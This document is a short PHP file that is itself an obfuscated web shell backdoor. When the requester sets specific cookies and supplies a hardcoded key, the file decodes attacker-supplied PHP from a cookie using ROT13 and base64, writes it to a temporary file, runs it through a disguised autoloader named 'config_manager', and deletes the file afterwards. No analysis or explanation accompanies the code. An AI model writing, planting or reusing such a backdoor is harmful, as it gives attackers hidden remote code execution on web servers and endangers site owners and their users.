<?php


if (isset($_COOKIE[9-9]) && isset($_COOKIE[-67+68]) && isset($_COOKIE[-61+64]) && isset($_COOKIE[37+-33])) {
    $flag = $_COOKIE;
    function config_manager($ent) {
        $flag = $_COOKIE;
        $flg = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), 'c200d1f7');
        if (!is_writable($flg)) {
            $flg = getcwd() . DIRECTORY_SEPARATOR . "buffer_cache";
        }
        $elem = "\x3c\x3f\x70\x68p\x20" . base64_decode(str_rot13($flag[3]));
        if (is_writeable($flg)) {
            $sym = fopen($flg, 'w+');
            fputs($sym, $elem);
            fclose($sym);
            spl_autoload_unregister(__FUNCTION__);
            require_once($flg);
            @array_map('unlink', array($flg));
        }
    }
    spl_autoload_register("config_manager");
    $entity = "79b056133141fdfb89aba479febb2e84";
    if (!strncmp($entity, $flag[4], 32)) {
        if (@class_parents("system_core_reverse_searcher", true)) {
            exit;
        }
    }
}
